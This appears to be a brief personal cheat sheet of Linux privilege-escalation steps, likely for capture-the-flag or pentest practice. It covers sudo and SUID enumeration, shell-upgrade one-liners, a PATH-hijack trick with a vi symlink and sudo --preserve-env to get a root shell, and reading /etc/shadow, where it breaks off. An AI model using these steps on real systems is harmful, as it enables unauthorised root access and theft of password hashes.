# 1. normal user
1. sudo -l to see what we can run as sudo without passwords
2. history to see the commands history
3. upgrade to a tty shell or reverse shell if possible

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'
```

4. find / -perm -u=s -type f 2>/dev/null
helps find vulnerabilities

5. if you can access a .sh file as su:


```plain-text
ln -s /bin/vi tail
export PATH=.:$PATH
sudo --preserve-env=PATH <path to sh file>
```
=> link with vim 
=> run bash in preserved environment
=> open vim to edit .sh file
=> when the file is open add :!/bin/sh
=> once the file is saved, /bin/sh is executed and you become root

6. linpeas for privilege escalation
7. ss -pnta to view open ports
8. ps aux to view processes

# 2. root access
- cat etc/shadow to get hashed passwords
- 